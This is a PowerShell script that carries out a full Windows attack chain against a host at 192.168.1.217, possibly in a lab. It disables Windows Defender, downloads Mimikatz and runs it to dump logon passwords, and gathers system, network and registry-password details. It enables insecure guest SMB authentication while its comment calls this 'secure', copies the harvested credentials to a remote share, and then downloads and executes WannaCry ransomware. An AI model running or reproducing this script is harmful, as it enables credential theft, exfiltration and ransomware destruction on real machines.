# Ensure the script is run with Administrator rights
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Error "This script requires Administrator privileges. Please run as Administrator."
    exit
}

# Check and set execution policy
$currentPolicy = Get-ExecutionPolicy
if ($currentPolicy -ne 'RemoteSigned' -and $currentPolicy -ne 'Unrestricted') {
    Set-ExecutionPolicy -Scope Process -ExecutionPolicy RemoteSigned -Force
}

# Disable Windows Defender real-time monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Confirm status
$status = Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring
if ($status -eq $true) {
    Write-Output "Windows Defender real-time monitoring is disabled."
} else {
    Write-Output "Failed to disable Windows Defender real-time monitoring."
}

# Download Mimikatz
$uri = "http://192.168.1.217/mimikatz.exe"
$output = "C:\Users\Public\mimikatz.exe"

Invoke-WebRequest -Uri $uri -OutFile $output

# Check if the file was downloaded
if (Test-Path $output) {
    Write-Output "mimikatz.exe downloaded successfully."

    # Execute Mimikatz and redirect output to a text file
    $mimikatzOutput = "C:\Users\Public\mimikatz_output.txt"
    Start-Process -FilePath $output -ArgumentList "privilege::debug sekurlsa::logonpasswords exit" -NoNewWindow -RedirectStandardOutput $mimikatzOutput -Wait
    Write-Output "mimikatz.exe executed."
}

# Additional discovery commands
Add-Content $mimikatzOutput -Value "`n--- Network Discovery ---`n"
cmd /c "net view /all" >> $mimikatzOutput
cmd /c "net view /all /domain" >> $mimikatzOutput

Add-Content $mimikatzOutput -Value "`n--- System Discovery ---`n"
Get-ComputerInfo >> $mimikatzOutput

Add-Content $mimikatzOutput -Value "`n--- Scheduled Tasks ---`n"
schtasks /query /fo LIST /v >> $mimikatzOutput

Add-Content $mimikatzOutput -Value "`n--- Installed Software ---`n"
wmic product get name, version, vendor >> $mimikatzOutput

Add-Content $mimikatzOutput -Value "`n--- Installed Patches ---`n"
wmic qfe get Caption, Description, HotFixID, InstalledOn >> $mimikatzOutput

Add-Content $mimikatzOutput -Value "`n--- Running Processes ---`n"
tasklist /SVC >> $mimikatzOutput

Add-Content $mimikatzOutput -Value "`n--- Network Configuration ---`n"
ipconfig /all >> $mimikatzOutput
wmic nicconfig get description,IPAddress,MACaddress >> $mimikatzOutput
route print >> $mimikatzOutput
arp -a >> $mimikatzOutput
netstat -ano >> $mimikatzOutput

Add-Content $mimikatzOutput -Value "`n--- Firewall Configuration ---`n"
netsh advfirewall show currentprofile >> $mimikatzOutput
netsh advfirewall firewall show rule name=all >> $mimikatzOutput

Add-Content $mimikatzOutput -Value "`n--- Windows Defender Status ---`n"
sc query windefend >> $mimikatzOutput

Add-Content $mimikatzOutput -Value "`n--- Registry Information ---`n"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> $mimikatzOutput
reg query "HKLM\Software\Microsoft\Windows NT\Currentversion\Winlogon" /v LastUsedUsername >> $mimikatzOutput
reg query HKLM /f password /t REG_SZ /s >> $mimikatzOutput
reg query HKCU /f password /t REG_SZ /s >> $mimikatzOutput

Add-Content $mimikatzOutput -Value "`n--- Hardware Information ---`n"
wmic bios get serialnumber >> $mimikatzOutput
wmic baseboard get manufacturer,product,serialnumber,version >> $mimikatzOutput
wmic cpu get name,numberofcores,numberoflogicalprocessors >> $mimikatzOutput

Add-Content $mimikatzOutput -Value "`n--- Unquoted Service Paths ---`n"
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" >> $mimikatzOutput

# Enable secure guest authentication in the registry
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "AllowInsecureGuestAuth" -Value 1
Write-Output "Secure guest authentication enabled in the registry."

# Define the local file path and remote share path
$localFilePath = "C:\Users\Public\mimikatz_output.txt"
$remoteSharePath = "\\192.168.1.217\share\mimikatz_output.txt"

# Check if the local file exists
if (-Not (Test-Path -Path $localFilePath)) {
    Write-Error "Local file does not exist: $localFilePath"
    exit
}

# Attempt to copy the file to the remote share
try {
    # Ensure that the destination directory exists
    $destinationDirectory = "\\192.168.1.217\share"
    if (-Not (Test-Path -Path $destinationDirectory)) {
        Write-Error "Destination directory does not exist: $destinationDirectory"
        exit
    }
    
    # Copy the file
    Copy-Item -Path $localFilePath -Destination $remoteSharePath -Force -ErrorAction Stop
    Write-Output "File copied successfully to $remoteSharePath"
} catch {
    Write-Error "Failed to copy the file. Error: $_"
}

# Optionally, verify if the file exists on the remote share
if (Test-Path -Path $remoteSharePath) {
    Write-Output "File successfully copied to remote share."
} else {
    Write-Error "File does not exist on the remote share."
}

# Download and execute WannaCry
$wannacryUri = "http://192.168.1.217/WannaCry.exe"
$wannacryOutput = "C:\Users\Public\WannaCry.exe"

Invoke-WebRequest -Uri $wannacryUri -OutFile $wannacryOutput

# Check if the file was downloaded
if (Test-Path $wannacryOutput) {
    Write-Output "WannaCry.exe downloaded successfully."

    # Execute WannaCry
    Start-Process -FilePath $wannacryOutput -NoNewWindow -Wait
    Write-Output "WannaCry.exe executed."
} else {
    Write-Output "Failed to download WannaCry.exe."
}
